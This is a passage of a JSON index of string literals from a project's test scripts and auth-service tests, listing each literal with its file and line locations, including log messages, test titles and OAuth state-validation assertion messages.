    "Starting optimized execution of": {
      "value": "Starting optimized execution of",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:125"
      ]
    },
    "Starting optimized test execution...": {
      "value": "Starting optimized test execution...",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:423"
      ]
    },
    "Starting service coordination fix validation": {
      "value": "Starting service coordination fix validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:39"
      ]
    },
    "Starting services for E2E tests...": {
      "value": "Starting services for E2E tests...",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:209"
      ]
    },
    "Starting test import alignment...": {
      "value": "Starting test import alignment...",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:41"
      ]
    },
    "Starting test overlap analysis for": {
      "value": "Starting test overlap analysis for",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:71"
      ]
    },
    "Starting with 1 DB issues in": {
      "value": "Starting with 1 DB issues in",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:146"
      ]
    },
    "Startup Test Executor\nHandles execution of backend, frontend, and E2E tests": {
      "value": "Startup Test Executor\nHandles execution of backend, frontend, and E2E tests",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:2"
      ]
    },
    "Startup Timing": {
      "value": "Startup Timing",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:240"
      ]
    },
    "Startup took": {
      "value": "Startup took",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:206"
      ]
    },
    "State collision detected:": {
      "value": "State collision detected:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:176"
      ]
    },
    "State parameter should be generated": {
      "value": "State parameter should be generated",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:69"
      ]
    },
    "State parameter too short:": {
      "value": "State parameter too short:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:47"
      ]
    },
    "State parameters must be cryptographically unique": {
      "value": "State parameters must be cryptographically unique",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:43"
      ]
    },
    "State parameters should be single-use to prevent replay attacks": {
      "value": "State parameters should be single-use to prevent replay attacks",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:148"
      ]
    },
    "State should be bound to specific session": {
      "value": "State should be bound to specific session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:165"
      ]
    },
    "State should be single-use:": {
      "value": "State should be single-use:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:222"
      ]
    },
    "State should be stored successfully": {
      "value": "State should be stored successfully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:139",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:183"
      ]
    },
    "State should be stored with session binding": {
      "value": "State should be stored with session binding",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:161"
      ]
    },
    "State should be valid with memory store": {
      "value": "State should be valid with memory store",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:123"
      ]
    },
    "State should contain HMAC separator": {
      "value": "State should contain HMAC separator",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:152"
      ]
    },
    "State should validate once:": {
      "value": "State should validate once:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:218"
      ]
    },
    "State should validate with correct session": {
      "value": "State should validate with correct session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:174"
      ]
    },
    "State validation failed for": {
      "value": "State validation failed for",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:329"
      ]
    },
    "State validation failed:": {
      "value": "State validation failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:357"
      ]
    },
    "Static Assets": {
      "value": "Static Assets",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:152"
      ]
    },
    "Static assets are being served": {
      "value": "Static assets are being served",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:136"
      ]
    },
    "Static assets returned status": {
      "value": "Static assets returned status",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:138"
      ]
    },
    "Static assets test failed:": {
      "value": "Static assets test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:140"
      ]
    },
    "Status": {
      "value": "Status",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:69"
      ]
    },
    "Status:": {
      "value": "Status:",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:373"
      ]
    },
    "Stderr:": {
      "value": "Stderr:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:133"
      ]
    },
    "Stdout:": {
      "value": "Stdout:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:132"
      ]
    },
    "Step 1: Running smoke, unit, and critical tests...": {
      "value": "Step 1: Running smoke, unit, and critical tests...",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:107"
      ]
    },
    "Step 2: Attempting to fix:": {
      "value": "Step 2: Attempting to fix:",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:122"
      ]
    },
    "Stop auth service completely to simulate it being down": {
      "value": "Stop auth service completely to simulate it being down",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:496"
      ]
    },
    "Stop on first test failure": {
      "value": "Stop on first test failure",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:489",
        "scripts/unified_test_runner.py:790"
      ]
    },
    "Stopping development server...": {
      "value": "Stopping development server...",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:239"
      ]
    },
    "Stopping execution:": {
      "value": "Stopping execution:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:319"
      ]
    },
    "Strategies:": {
      "value": "Strategies:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:92",
        "scripts/compliance/test_refactor_helper.py:710"
      ]
    },
    "Stress tests with high load or concurrency": {
      "value": "Stress tests with high load or concurrency",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:100"
      ]
    },
    "Strict mode - fail on any violations": {
      "value": "Strict mode - fail on any violations",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:525"
      ]
    },
    "Success Rate:": {
      "value": "Success Rate:",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:123",
        "scripts/batch_fix_and_test.py:133",
        "scripts/test_backend_optimized.py:336",
        "scripts/test_coordination_fixes.py:382",
        "scripts/test_example_message_flow.py:327",
        "scripts/test_staging_deployment.py:218",
        "scripts/test_verify_workflow_status_corrected.py:197"
      ]
    },
    "Success Rate: N/A": {
      "value": "Success Rate: N/A",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:329"
      ]
    },
    "Success rate too low:": {
      "value": "Success rate too low:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:336"
      ]
    },
    "Success rate:": {
      "value": "Success rate:",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:143",
        "scripts/comprehensive_test_fixer.py:396"
      ]
    },
    "Successful renames:": {
      "value": "Successful renames:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:283"
      ]
    },
    "Successful test runs:": {
      "value": "Successful test runs:",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:135",
        "scripts/automated_test_fix_loop.py:142"
      ]
    },
    "Successfully fixed:": {
      "value": "Successfully fixed:",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:392"
      ]
    },
    "Suggested refactoring strategies:": {
      "value": "Suggested refactoring strategies:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:210"
      ]
    },
    "Suggested splitting strategies:": {
      "value": "Suggested splitting strategies:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:194"
      ]
    },
    "Suggestion: Extract helper methods or split test logic": {
      "value": "Suggestion: Extract helper methods or split test logic",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:846"
      ]
    },
    "Suggestion: Focus on core unit tests that test business logic": {
      "value": "Suggestion: Focus on core unit tests that test business logic",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:79"
      ]
    },
    "Suite Breakdown:": {
      "value": "Suite Breakdown:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:332"
      ]
    },
    "Summary:": {
      "value": "Summary:",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:225",
        "scripts/fix_all_test_issues.py:286",
        "scripts/fix_test_import_order.py:107",
        "scripts/iterative_test_fix_loop.py:163",
        "scripts/remove_test_stubs.py:374",
        "scripts/test_verify_workflow_status.py:223"
      ]
    },
    "Supports": {
      "value": "Supports",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:500"
      ]
    },
    "Sync URL has SSL:": {
      "value": "Sync URL has SSL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:147"
      ]
    },
    "Sync URL:": {
      "value": "Sync URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:97",
        "scripts/test_database_url_builder_comprehensive.py:49",
        "scripts/test_database_url_builder_comprehensive.py:274",
        "scripts/test_ssl_certificates_staging.py:140",
        "scripts/test_ssl_certificates_staging.py:236"
      ]
    },
    "Syntax error in": {
      "value": "Syntax error in",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:356",
        "scripts/compliance/test_size_validator.py:201"
      ]
    },
    "Syntax error:": {
      "value": "Syntax error:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:142",
        "scripts/compliance/real_test_requirements_enforcer.py:201",
        "scripts/compliance/real_test_validator.py:97",
        "scripts/compliance/test_refactor_helper.py:82"
      ]
    },
    "Syntax errors fixed:": {
      "value": "Syntax errors fixed:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:288"
      ]
    },
    "Syntax fixes applied:": {
      "value": "Syntax fixes applied:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:429"
      ]
    },
    "SyntaxError": {
      "value": "SyntaxError",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:28",
        "scripts/simple_test_fix_loop.py:28"
      ]
    },
    "System Startup Test Runner\nModular test runner for system startup and E2E tests\nLegacy entry point - redirects to new modular implementation": {
      "value": "System Startup Test Runner\nModular test runner for system startup and E2E tests\nLegacy entry point - redirects to new modular implementation",
      "category": "test_literals",
      "locations": [
        "scripts/test_system_startup.py:2"
      ]
    },
    "System should be healthy despite degraded services": {
      "value": "System should be healthy despite degraded services",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:268"
      ]
    },
    "TCP": {
      "value": "TCP",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:80"
      ]
    },
    "TCP Async SSL URL:": {
      "value": "TCP Async SSL URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:109"
      ]
    },
    "TCP Async URL:": {
      "value": "TCP Async URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:107"
      ]
    },
    "TCP Configuration": {
      "value": "TCP Configuration",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:306"
      ]
    },
    "TCP Sync SSL URL:": {
      "value": "TCP Sync SSL URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:110"
      ]
    },
    "TCP Sync URL:": {
      "value": "TCP Sync URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:108"
      ]
    },
    "TCP URL with ssl for psycopg2 conversion": {
      "value": "TCP URL with ssl for psycopg2 conversion",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:154"
      ]
    },
    "TCP URL with sslmode for asyncpg conversion": {
      "value": "TCP URL with sslmode for asyncpg conversion",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:150"
      ]
    },
    "TCP config available:": {
      "value": "TCP config available:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:82"
      ]
    },
    "TCP connection mode": {
      "value": "TCP connection mode",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:248"
      ]
    },
    "TCP staging URL (should have SSL parameters)": {
      "value": "TCP staging URL (should have SSL parameters)",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:114"
      ]
    },
    "TEST ALIGNMENT SUMMARY": {
      "value": "TEST ALIGNMENT SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:425"
      ]
    },
    "TEST CATEGORIES & COUNTS": {
      "value": "TEST CATEGORIES & COUNTS",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:100"
      ]
    },
    "TEST COMPLIANCE REPORT": {
      "value": "TEST COMPLIANCE REPORT",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:157"
      ]
    },
    "TEST EXECUTION SUMMARY": {
      "value": "TEST EXECUTION SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:690"
      ]
    },
    "TEST FILE SIZE VIOLATIONS (": {
      "value": "TEST FILE SIZE VIOLATIONS (",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:75"
      ]
    },
    "TEST FUNCTION VIOLATIONS (": {
      "value": "TEST FUNCTION VIOLATIONS (",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:94"
      ]
    },
    "TEST LIMITS VIOLATIONS REPORT": {
      "value": "TEST LIMITS VIOLATIONS REPORT",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:34"
      ]
    },
    "TEST MAPPING TO ORIGINAL ISSUES:": {
      "value": "TEST MAPPING TO ORIGINAL ISSUES:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:391"
      ]
    },
    "TEST OVERLAP ANALYSIS COMPLETE": {
      "value": "TEST OVERLAP ANALYSIS COMPLETE",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:654"
      ]
    },
    "TEST PROCESS CLEANUP": {
      "value": "TEST PROCESS CLEANUP",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:97"
      ]
    },
    "TEST RESULTS": {
      "value": "TEST RESULTS",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:333"
      ]
    },
    "TEST RESULTS:": {
      "value": "TEST RESULTS:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:301"
      ]
    },
    "TEST SIZE COMPLIANCE REPORT": {
      "value": "TEST SIZE COMPLIANCE REPORT",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:416"
      ]
    },
    "TEST SIZE FIXING SUMMARY": {
      "value": "TEST SIZE FIXING SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:746"
      ]
    },
    "TEST SIZE LIMITS ENFORCEMENT SYSTEM DEMONSTRATION": {
      "value": "TEST SIZE LIMITS ENFORCEMENT SYSTEM DEMONSTRATION",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:201"
      ]
    },
    "TEST STUB DETECTION REPORT": {
      "value": "TEST STUB DETECTION REPORT",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:307"
      ]
    },
    "TEST SUMMARY": {
      "value": "TEST SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:330",
        "scripts/test_staging_deployment.py:213",
        "scripts/test_staging_env.py:186",
        "scripts/test_verify_workflow_status_corrected.py:188"
      ]
    },
    "TEST TYPE SUMMARY": {
      "value": "TEST TYPE SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:113"
      ]
    },
    "TESTING": {
      "value": "TESTING",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:49",
        "auth_service/tests/config/test_settings.py:163",
        "scripts/test_backend.py:78",
        "scripts/test_environment_detection.py:19",
        "scripts/unified_test_runner.py:207"
      ]
    },
    "TESTING ALEMBIC CONFIGURATION": {
      "value": "TESTING ALEMBIC CONFIGURATION",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:91"
      ]
    },
    "TESTING AUTH DATABASE ENGINE CREATION": {
      "value": "TESTING AUTH DATABASE ENGINE CREATION",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:118"
      ]
    },
    "TESTING AUTH DATABASE SESSION LIFECYCLE": {
      "value": "TESTING AUTH DATABASE SESSION LIFECYCLE",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:297"
      ]
    },
    "TESTING AUTH DATABASE STAGING INTEGRATION": {
      "value": "TESTING AUTH DATABASE STAGING INTEGRATION",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:215"
      ]
    },
    "TESTING AUTH DATABASE URL CONVERSION": {
      "value": "TESTING AUTH DATABASE URL CONVERSION",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:68"
      ]
    },
    "TESTING AUTH DATABASE URL VALIDATION": {
      "value": "TESTING AUTH DATABASE URL VALIDATION",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:161"
      ]
    },
    "TESTING AUTH SERVICE DATABASE MANAGER IMPORT": {
      "value": "TESTING AUTH SERVICE DATABASE MANAGER IMPORT",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:29"
      ]
    },
    "TESTING CLOUD SQL CONFIGURATION": {
      "value": "TESTING CLOUD SQL CONFIGURATION",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:16"
      ]
    },
    "TESTING CONNECTION POOLING URL SCENARIOS": {
      "value": "TESTING CONNECTION POOLING URL SCENARIOS",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:256"
      ]
    },
    "TESTING DATABASE MIGRATION COMMANDS": {
      "value": "TESTING DATABASE MIGRATION COMMANDS",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:217"
      ]
    },
    "TESTING DRIVER URL FORMATTING": {
      "value": "TESTING DRIVER URL FORMATTING",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:117"
      ]
    },
    "TESTING MIGRATION SAFETY CHECKS": {
      "value": "TESTING MIGRATION SAFETY CHECKS",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:177"
      ]
    },
    "TESTING MIGRATION URL GENERATION": {
      "value": "TESTING MIGRATION URL GENERATION",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:29"
      ]
    },
    "TESTING MODULE:": {
      "value": "TESTING MODULE:",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:75"
      ]
    },
    "TESTING SSL CERTIFICATE VALIDATION": {
      "value": "TESTING SSL CERTIFICATE VALIDATION",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:30"
      ]
    },
    "TESTING SSL PARAMETER HANDLING": {
      "value": "TESTING SSL PARAMETER HANDLING",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:140"
      ]
    },
    "TESTING SSL PARAMETER HANDLING IN URLs": {
      "value": "TESTING SSL PARAMETER HANDLING IN URLs",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:103"
      ]
    },
    "TESTING STAGING DATABASE CONNECTION": {
      "value": "TESTING STAGING DATABASE CONNECTION",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:32"
      ]
    },
    "TESTING STAGING SSL CONFIGURATION WITH REAL SECRETS": {
      "value": "TESTING STAGING SSL CONFIGURATION WITH REAL SECRETS",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:200"
      ]
    },
    "TESTING TCP CONFIGURATION": {
      "value": "TESTING TCP CONFIGURATION",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:73"
      ]
    },
    "TESTING URL DRIVER COMPATIBILITY FOR SSL": {
      "value": "TESTING URL DRIVER COMPATIBILITY FOR SSL",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:166"
      ]
    },
    "TESTING VALIDATION EDGE CASES": {
      "value": "TESTING VALIDATION EDGE CASES",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:178"
      ]
    },
    "TESTING | Service startup orchestration...": {
      "value": "TESTING | Service startup orchestration...",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:21"
      ]
    },
    "TEST_DATABASE_URL": {
      "value": "TEST_DATABASE_URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:29"
      ]
    },
    "TEST_DIRECTORIES = {\n    \"unit\": [\"netra_backend/tests/unit\"],\n    \"integration\": [\"netra_backend/tests/integration\"],\n    \"e2e\": [\"netra_backend/tests/e2e\"],\n    \"agents\": [\"netra_backend/tests/agents\"],\n    \"critical\": [\"netra_backend/tests/critical\"],\n    \"routes\": [\"netra_backend/tests/routes\"],\n    \"services\": [\"netra_backend/tests/services\"],\n    \"database\": [\"netra_backend/tests/database\"],\n    \"websocket\": [\"netra_backend/tests/websocket\"],\n    \"auth\": [\"netra_backend/tests/auth_integration\"],\n    \"performance\": [\"netra_backend/tests/performance\"],\n    \"security\": [\"netra_backend/tests/security\"],\n    \"mcp\": [\"netra_backend/tests/mcp\"],\n    \"utils\": [\"netra_backend/tests/utils\"],\n    \"validation\": [\"netra_backend/tests/validation\"],\n    \"config\": [\"netra_backend/tests/config\"],\n    \"startup\": [\"netra_backend/tests/startup\"],\n    \"llm\": [\"netra_backend/tests/llm\"],\n    \"core\": [\"netra_backend/tests/core\"],\n    \"unified_system\": [\"netra_backend/tests/unified_system\"],\n    \"test_framework\": [\"test_framework/tests\"]\n}": {
      "value": "TEST_DIRECTORIES = {\n    \"unit\": [\"netra_backend/tests/unit\"],\n    \"integration\": [\"netra_backend/tests/integration\"],\n    \"e2e\": [\"netra_backend/tests/e2e\"],\n    \"agents\": [\"netra_backend/tests/agents\"],\n    \"critical\": [\"netra_backend/tests/critical\"],\n    \"routes\": [\"netra_backend/tests/routes\"],\n    \"services\": [\"netra_backend/tests/services\"],\n    \"database\": [\"netra_backend/tests/database\"],\n    \"websocket\": [\"netra_backend/tests/websocket\"],\n    \"auth\": [\"netra_backend/tests/auth_integration\"],\n    \"performance\": [\"netra_backend/tests/performance\"],\n    \"security\": [\"netra_backend/tests/security\"],\n    \"mcp\": [\"netra_backend/tests/mcp\"],\n    \"utils\": [\"netra_backend/tests/utils\"],\n    \"validation\": [\"netra_backend/tests/validation\"],\n    \"config\": [\"netra_backend/tests/config\"],\n    \"startup\": [\"netra_backend/tests/startup\"],\n    \"llm\": [\"netra_backend/tests/llm\"],\n    \"core\": [\"netra_backend/tests/core\"],\n    \"unified_system\": [\"netra_backend/tests/unified_system\"],\n    \"test_framework\": [\"test_framework/tests\"]\n}",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:244"
      ]
    },
    "TEST_DIRECTORIES\\s*=\\s*\\{[^}]+\\}": {
      "value": "TEST_DIRECTORIES\\s*=\\s*\\{[^}]+\\}",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:242"
      ]
    },
    "TEST_ENV": {
      "value": "TEST_ENV",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:302",
        "scripts/unified_test_runner.py:197",
        "scripts/unified_test_runner.py:593"
      ]
    },
    "TEST_MODE": {
      "value": "TEST_MODE",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:158",
        "scripts/unified_test_runner.py:615",
        "scripts/unified_test_runner.py:618"
      ]
    },
    "TEST_ORGANIZATION_AUDIT.md": {
      "value": "TEST_ORGANIZATION_AUDIT.md",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:267"
      ]
    },
    "TEST_UTILS IMPORT FIX RESULTS": {
      "value": "TEST_UTILS IMPORT FIX RESULTS",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_utils_imports.py:90"
      ]
    },
    "TIER COVERAGE:": {
      "value": "TIER COVERAGE:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:740"
      ]
    },
    "TIMEOUT": {
      "value": "TIMEOUT",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:381"
      ]
    },
    "TIMEOUT: Alembic command timed out": {
      "value": "TIMEOUT: Alembic command timed out",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:165"
      ]
    },
    "TOKEN_CREATED": {
      "value": "TOKEN_CREATED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:26",
        "auth_service/tests/factories/audit_factory.py:134"
      ]
    },
    "TOKEN_REFRESHED": {
      "value": "TOKEN_REFRESHED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:27"
      ]
    },
    "TOKEN_REVOKED": {
      "value": "TOKEN_REVOKED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:28"
      ]
    },
    "TOP OPTIMIZATION RECOMMENDATIONS": {
      "value": "TOP OPTIMIZATION RECOMMENDATIONS",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:342"
      ]
    },
    "TOP VALUE TESTS:": {
      "value": "TOP VALUE TESTS:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:753"
      ]
    },
    "TOTAL:": {
      "value": "TOTAL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:121"
      ]
    },
    "TRACEBACK:": {
      "value": "TRACEBACK:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:97",
        "scripts/test_staging_db_direct.py:114"
      ]
    },
    "Tables created in transaction": {
      "value": "Tables created in transaction",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:36"
      ]
    },
    "Tables found after transaction:": {
      "value": "Tables found after transaction:",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:48"
      ]
    },
    "Tables found in transaction:": {
      "value": "Tables found in transaction:",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:41"
      ]
    },
    "Target:": {
      "value": "Target:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:182"
      ]
    },
    "Test": {
      "value": "Test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:46",
        "scripts/analyze_test_overlap.py:124",
        "scripts/business_value_test_index.py:212",
        "scripts/compliance/test_fixer.py:142",
        "scripts/compliance/test_refactor_helper.py:262",
        "scripts/compliance/test_refactor_helper.py:537",
        "scripts/compliance/test_size_validator.py:276",
        "scripts/compliance/test_size_validator.py:278",
        "scripts/fix_all_test_issues.py:156",
        "scripts/test_oauth_local.py:350"
      ]
    },
    "Test 10: Expired ID token": {
      "value": "Test 10: Expired ID token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:516"
      ]
    },
    "Test 11: Missing email in OAuth provider response": {
      "value": "Test 11: Missing email in OAuth provider response",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:557"
      ]
    },
    "Test 12: Unverified email address from OAuth provider": {
      "value": "Test 12: Unverified email address from OAuth provider",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:597"
      ]
    },
    "Test 13: Blocked email domain (spam/disposable)": {
      "value": "Test 13: Blocked email domain (spam/disposable)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:638"
      ]
    },
    "Test 14: Distributed tracing context propagation across services (L3)": {
      "value": "Test 14: Distributed tracing context propagation across services (L3)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:681"
      ]
    },
    "Test 15: Circuit breaker activation on repeated OAuth provider failures (L3)": {
      "value": "Test 15: Circuit breaker activation on repeated OAuth provider failures (L3)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:742"
      ]
    },
    "Test 16: Network connection failure to OAuth provider": {
      "value": "Test 16: Network connection failure to OAuth provider",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:780"
      ]
    },
    "Test 17: Database connection failure during user creation": {
      "value": "Test 17: Database connection failure during user creation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:803"
      ]
    },
    "Test 18: Redis session storage failure": {
      "value": "Test 18: Redis session storage failure",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:860"
